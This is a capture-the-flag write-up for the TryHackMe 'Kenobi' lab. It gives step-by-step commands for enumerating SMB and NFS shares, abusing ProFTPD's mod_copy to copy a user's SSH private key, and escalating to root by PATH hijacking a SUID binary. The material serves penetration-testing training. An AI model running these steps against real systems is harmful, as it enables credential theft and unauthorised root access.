# Kenobi \(L\) \(wlk\)

_TryHackMe_ - [**Kenobi**](https://tryhackme.com/room/kenobi) Write-Up

_topics:_ enumerate Samba for shares, manipulate vulnerable version of proftpd, privesc with path var manipulation

## 1\) Enumeration \(nmap\)

* `nmap  -vvv`: lists only all open ports
  * 7 open ports

    2.1\) Enumerating Samba
* Samba is the interoperability of Windows and Unix, often refered to as a network file system. It frequently uses Server Message Block protocol \(SMB\) that runs on port 445 and 139. 
* using nmaps default scripts, we can detect how many SMB shares \(directories\) the server is using
* `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse` __: returns 3 shares 
* _smbclient_: installed on most Linux machines, used to inspect smb shares
  * `smbclient smb://ip/share`: takes you to system, asks for password but hit ENTER, there is none. Simple ls shows there is a log.txt file located on the share. 
  * SMB shares can be recursively downloaded to inspect the contents. `smbget -R smb://ip/anonymous`
  * `mousepad log.txt` shows that there is information generated for Kenobi's SSH user key and ProFTPD server
* The most interesting find here is that **remote procedure call \(RPC\)** is open on port 111. It's a server that converts RPC program number into universal addresses. Once RPC starts it tells rpcbind the address where it is listening and the RPC program number it's serving. Access into the network file system. 
* `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount` __: reveals mounted at /var

## 2\) Obtain Access

* to find which version ProFTPd is running, use netcat to listen on FTP port. _nc_  
* **searchsploit** can be used to find exploits on exploit-db.com for a particular software version
  * `searchsploit proftpd` __
  * the exploit _mod\_copy_ will be most appropriate. It implements the SITE CPFR and SITE CPTO commands, which are used to copy files & directories between paths on the server. An unauthenticated client can abuse these commands to copy files from any path to another. 
* following this, use the commands to copy the private key. We already know the /var directory was mounted so we move it to /var/tmp/id\_rsa. _SITE CPFR_ , _SITE CPTO /var/tmp/id\_rsa_    
* mount the directory to our machine `mkdir /mnt/kenobiNFS; mount :/var /mnt/kenobiNFS; ls`
* go to /var/tmp to get the key and login

`cp /mnt/kenobiNFS/id_rsa .`

`chmod 600 id_rsa`

`ssh -i id_rsa kenobi@ip`

## 3\) root

* SUID needs to be used by some binaries such as passwd \(needs to reset password on system\) but custom files with the SUID bit are dangerous and can be used to exploit privileges.
* search for all SUID files `find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null`
  * _/usr/bin/menu_ is unusual because menu is not a binary file
* the _strings_ command parses for human readable strings in a binary. 
  * this returns `curl -I localhost`_,_ `uname -r`_, ifconfig_ which means the binary is running other binaries without a full path \(not using /usr/bin/curl or /usr/bin/uname\), because this file is SUID \(e.g running with **root** privileges\) the path can be manipulated to gain a root shell
* copy the default shell _/bin/sh_ and call it curl. Change permissions and put its location in the PATH. When the /usr/bin/menu binary runs, it will use our path variable to find the 'curl' binary which is actually _/bin/sh_ because the file is run as root, so is our shell. 
* cd to /tmp 

`echo /bin/sh > curl`

`chmod 777 curl`

`export PATH=/tmp:$PATH`

`/usr/bin/menu`

`select 1` 

`cat /root/root.txt`

